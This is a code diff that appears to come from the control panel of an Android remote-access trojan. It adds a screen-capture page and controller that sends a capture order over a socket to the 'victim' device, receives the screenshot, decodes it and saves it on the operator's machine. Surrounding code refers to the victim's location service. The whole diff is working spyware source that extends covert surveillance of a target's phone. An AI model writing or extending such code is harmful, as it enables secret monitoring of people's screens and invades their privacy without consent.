@@ -45,6 +45,10 @@ app.config(function ($routeProvider) {
         .when("/location", {
             templateUrl: "./views/location.html",
             controller: "LocCtrl"
+        })
+        .when("/screenCapture", {
+            templateUrl: "./views/screenCapture.html",
+            controller: "ScreenCtrl"
         });
 });
 
@@ -607,5 +611,137 @@ app.controller("LocCtrl", function ($scope, $rootScope) {
             $rootScope.Log('Location Service is not enabled on Victim\'s Device', CONSTANTS.logStatus.FAIL);
 
     });
+
+});
+
+
+
+//-----------------------Screen Capture Controller (screenCapture.htm)------------------------
+// Screen capture controller
+app.controller("ScreenCtrl", function ($scope, $rootScope) {
+    $screenCtrl = $scope;
+    $screenCtrl.isSaveShown = false;
+    $screenCtrl.imgUrl = null;
+    $screenCtrl.base64String = null; // Store base64 for saving
+    var screenCapture = CONSTANTS.orders.screenCapture;
+
+    // remove socket listner if the screen capture page is changed or destroied
+    $screenCtrl.$on('$destroy', () => {
+        // release resources, cancel Listner...
+        socket.removeAllListeners(screenCapture);
+    });
+
+    $rootScope.Log('Screen capture ready');
+    $screenCtrl.load = '';
+
+    // wait any response from victim
+    socket.on(screenCapture, (data) => {
+        console.log('[GUI] === Received data on event:', screenCapture);
+        console.log('[GUI] Data type:', typeof data);
+        console.log('[GUI] Data keys:', Object.keys(data));
+        console.log('[GUI] data.image:', data.image);
+        console.log('[GUI] data.error:', data.error);
+        console.log('[GUI] data.buffer type:', typeof data.buffer);
+        console.log('[GUI] data.buffer length:', data.buffer ? data.buffer.length : 'null');
+        
+        if (data.error == true) { // error response
+            console.error('[GUI] Error received:', data.message);
+            $rootScope.Log('Screen capture error: ' + data.message, CONSTANTS.logStatus.FAIL);
+            $screenCtrl.load = '';
+            $screenCtrl.isSaveShown = false;
+            $screenCtrl.$apply();
+        } else if (data.image == true) { // the response is screenshot
+            console.log('[GUI] Image data received');
+            console.log('[GUI] Buffer type:', Array.isArray(data.buffer) ? 'Array' : typeof data.buffer);
+            console.log('[GUI] Buffer length:', data.buffer ? data.buffer.length : 'null');
+            
+            $rootScope.Log('Screenshot arrived', CONSTANTS.logStatus.SUCCESS);
+
+            try {
+                // convert binary to base64
+                console.log('[GUI] Converting buffer to Uint8Array...');
+                var uint8Arr;
+                
+                if (data.buffer instanceof Array) {
+                    console.log('[GUI] Buffer is Array, converting...');
+                    uint8Arr = new Uint8Array(data.buffer);
+                } else if (data.buffer instanceof Uint8Array) {
+                    console.log('[GUI] Buffer is already Uint8Array');
+                    uint8Arr = data.buffer;
+                } else if (Buffer.isBuffer && Buffer.isBuffer(data.buffer)) {
+                    console.log('[GUI] Buffer is Node.js Buffer, converting...');
+                    uint8Arr = new Uint8Array(data.buffer);
+                } else {
+                    console.error('[GUI] Unknown buffer type:', typeof data.buffer);
+                    throw new Error('Unknown buffer type: ' + typeof data.buffer);
+                }
+                
+                console.log('[GUI] Uint8Array length:', uint8Arr.length);
+                
+                var binary = '';
+                console.log('[GUI] Converting to binary string...');
+                for (var i = 0; i < uint8Arr.length; i++) {
+                    binary += String.fromCharCode(uint8Arr[i]);
+                }
+                console.log('[GUI] Binary string length:', binary.length);
+                
+                console.log('[GUI] Converting to base64...');
+                var base64String = window.btoa(binary);
+                console.log('[GUI] Base64 string length:', base64String.length);
+                console.log('[GUI] Base64 preview (first 50 chars):', base64String.substring(0, 50));
+
+                // Store in scope for saving
+                $screenCtrl.base64String = base64String;
+                $screenCtrl.imgUrl = 'data:image/jpeg;base64,' + base64String;
+                $screenCtrl.isSaveShown = true;
+                $screenCtrl.load = '';
+                console.log('[GUI] Image URL set, applying scope...');
+                $screenCtrl.$apply();
+                console.log('[GUI] Scope applied, image should be visible');
+            } catch (e) {
+                console.error('[GUI] Error processing screenshot:', e);
+                console.error('[GUI] Error stack:', e.stack);
+                $rootScope.Log('Error processing screenshot: ' + e.message, CONSTANTS.logStatus.FAIL);
+                $screenCtrl.load = '';
+                $screenCtrl.isSaveShown = false;
+                $screenCtrl.$apply();
+            }
+        } else {
+            console.warn('[GUI] Unknown data format:', data);
+        }
+    });
+
+    // Save screenshot function
+    $screenCtrl.saveScreenshot = () => {
+        if (!$screenCtrl.base64String) {
+            $rootScope.Log('No screenshot to save', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+
+        $rootScope.Log('Saving screenshot..');
+        var picPath = path.join(downloadsPath, "screenshot_" + Date.now() + ".jpg");
+        fs.outputFile(picPath, new Buffer($screenCtrl.base64String, "base64"), (err) => {
+            if (!err)
+                $rootScope.Log('Screenshot saved on ' + picPath, CONSTANTS.logStatus.SUCCESS);
+            else
+                $rootScope.Log('Saving screenshot failed: ' + err.message, CONSTANTS.logStatus.FAIL);
+        });
+    };
+
+    $screenCtrl.capture = () => {
+        // send capture request to victim
+        console.log('[GUI] Sending screen capture command');
+        console.log('[GUI] screenCapture constant:', screenCapture);
+        console.log('[GUI] Socket connected:', socket.connected);
+        console.log('[GUI] Socket ID:', socket.id);
+        
+        $rootScope.Log('Capturing screen...');
+        $screenCtrl.load = 'loading';
+        $screenCtrl.isSaveShown = false;
+        $screenCtrl.imgUrl = null;
+        socket.emit(ORDER, { order: screenCapture });
+        
+        console.log('[GUI] Command sent:', { order: screenCapture });
+    }
 
 });
